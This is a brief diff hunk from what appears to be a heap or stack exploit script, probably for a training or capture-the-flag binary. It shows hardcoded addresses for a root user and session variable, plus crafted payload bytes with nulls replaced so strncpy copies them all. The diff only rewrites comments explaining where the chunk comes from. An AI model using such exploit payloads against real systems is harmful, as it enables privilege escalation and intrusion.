@@ -448,8 +448,10 @@ root_user_addr = 0x8124090
 # addresss of the session global var
 session_addr = 0x811df58
 
-# this chunk is a copy of the peter chunk (starting at byte 8) 
-# and a few following bytes, where all 0x00 bytes were replaced by 0xAA
+# this chunk is taken from the stack of change_name() starting at byte 8 of input_username
+# (the first eight bytes are defined by root_user_addr and delete_mem_chunk) and a few 
+# following bytes, where all 0x00 bytes were replaced by 0xAA so strncpy will copy all of
+# them
 some_chunk = (
 "\x41\x41\x03\xAA\xAA\xAA\xb8\xcc"
 "\xff\xff\x18\xAA\xAA\xAA\x01\xAA"
